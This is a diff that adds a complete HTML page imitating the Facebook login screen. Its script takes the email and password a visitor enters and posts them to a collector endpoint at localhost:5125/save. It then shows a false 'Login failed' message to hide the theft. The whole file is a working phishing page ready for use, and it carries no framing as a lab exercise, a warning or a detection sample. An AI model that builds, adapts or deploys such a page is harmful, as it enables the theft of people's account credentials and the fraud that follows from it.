@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #e9ebee;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            margin-right: 10px;
+        }
+        input {
+            display: block;
+            width: 100%;
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #1358a3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
+                 alt="Facebook Logo"
+                 width="40">
+            <h2>Facebook</h2>
+        </div>
+        <input type="text" id="email" placeholder="Email or Phone">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="sendData()">Log In</button>
+    </div>
+
+    <script>
+        function sendData() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (!email || !password) {
+                alert("Please enter your credentials.");
+                return;
+            }
+
+            fetch("http://localhost:5125/save", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ email, password })
+            })
+            .then(response => response.text())
+            .then(data => alert("Login failed. Try again later."))
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
